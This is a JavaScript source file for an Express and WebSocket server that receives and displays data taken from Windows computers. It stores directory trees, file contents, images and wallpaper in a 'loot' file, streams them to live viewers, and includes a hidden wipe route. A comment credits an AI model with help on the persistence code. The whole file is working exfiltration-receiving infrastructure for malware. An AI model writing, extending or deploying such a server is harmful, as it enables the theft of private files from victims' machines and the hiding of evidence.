const express = require('express');
const { WebSocketServer } = require('ws');
const http = require('http');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server });

app.use(express.text({ limit: '50mb' }));  // sets limit so we can have decently large file sizes.
app.use(express.json());
app.use(express.static('public'));
app.use(express.urlencoded({ extended: true }));

const LOOT_FILE = './loot.json';

// stores all of the good stuff
let loot = {
  directories: {},
  files: {},
  images: {},
  wallpaper: null
};
// Needed help from claude on this one. Persistence is a bitch
if (fs.existsSync(LOOT_FILE)) {
  try {
    loot = JSON.parse(fs.readFileSync(LOOT_FILE, 'utf8'));
    console.log('Loaded loot from disk');
  } catch (e) {
    console.log('Failed to load loot.json, starting fresh');
  }
}

// Writes loot to disk so it survives restarts
function saveLoot() {
  fs.writeFileSync(LOOT_FILE, JSON.stringify(loot), 'utf8');
}

//Function to send out the data to each person connected
function broadcast(type, data) {
  wss.clients.forEach((client) => {
    client.send(JSON.stringify({ type, data }));
  });
}

// Adds path to the 'tree' which is basically just a parent child structure. The starting parent is always the C: drive
function addPathToTree(tree, filePath) {
  const parts = filePath.trim().split('\\');
  let current = tree;
  for (let i = 0; i < parts.length; i++) {
    const part = parts[i];
    if (i === parts.length - 1 && part.includes('.')) {
      current[part] = null;
    } else {
      if (!current[part]) current[part] = {};
      current = current[part];
    }
  }
}

app.post('/upload/wallpaper', (req, res) => {
  const firstNewline = req.body.indexOf('\n');
  const path = req.body.substring(0, firstNewline).trim();
  const base64 = req.body.substring(firstNewline + 1);
  console.log('Wallpaper received');
  loot.wallpaper = { path, base64 };
  saveLoot();
  broadcast('wallpaper', { path, base64 });
  res.sendStatus(200);
});

app.post('/upload/dirs', (req, res) => {
  const lines = req.body.split('\n');
  lines.forEach(line => {
    if (line.trim()) addPathToTree(loot.directories, line); // When .split('\n') happens, sometime sthere is trailing white space, this basically says if
  }); // when you trim the string, the string is empty, skip it. Else do the addPathToTree
  saveLoot();
  broadcast('dirs', loot.directories);
  res.sendStatus(200);
});

app.post('/upload/files', (req, res) => {
  const firstNewline = req.body.indexOf('\n');
  const path = req.body.substring(0, firstNewline).trim(); // Gets the full path of the file, including the .png .txt etc etc
  const text = req.body.substring(firstNewline + 1); // Gets the text within the file that was sent
  console.log('File received', path); // Logs to console for debugging
  loot.files[path] = text;
  saveLoot();
  broadcast('files', { path, text }); // broadcasts to browsers on the page
  res.sendStatus(200); // Confirm connection
});

app.post('/upload/image', (req, res) => {
  const firstNewline = req.body.indexOf('\n');
  const path = req.body.substring(0, firstNewline).trim();
  const base64 = req.body.substring(firstNewline + 1); // Gets full path of file, and the base64 string that 'contains' the image
  console.log('Image received:', path); // for debugging
  loot.images[path] = base64;
  saveLoot();
  broadcast('image', { path, base64 }); // broadcast to the active connections
  res.sendStatus(200);
});

// Secret wipe route — only you know this URL
app.get('/admin/wipe-a8f3k2', (req, res) => {
  loot = { directories: {}, files: {}, images: {}, wallpaper: null };
  saveLoot();
  broadcast('reset', {});
  console.log('Loot wiped');
  res.send('Wiped');
});

app.get('/api/loot', (req, res) => {
  res.json(loot);
});

wss.on('connection', (ws) => {
  console.log('Browser connected');
  ws.send(JSON.stringify({ type: 'dirs', data: loot.directories }));
  Object.entries(loot.files).forEach(([path, text]) => {
    ws.send(JSON.stringify({ type: 'files', data: { path, text } }));
  });
  Object.entries(loot.images).forEach(([path, base64]) => {
    ws.send(JSON.stringify({ type: 'image', data: { path, base64 } }));
  });
  if (loot.wallpaper) {
    ws.send(JSON.stringify({ type: 'wallpaper', data: loot.wallpaper }));
  }
});

server.listen(8080, () => console.log('Listening on 8080'));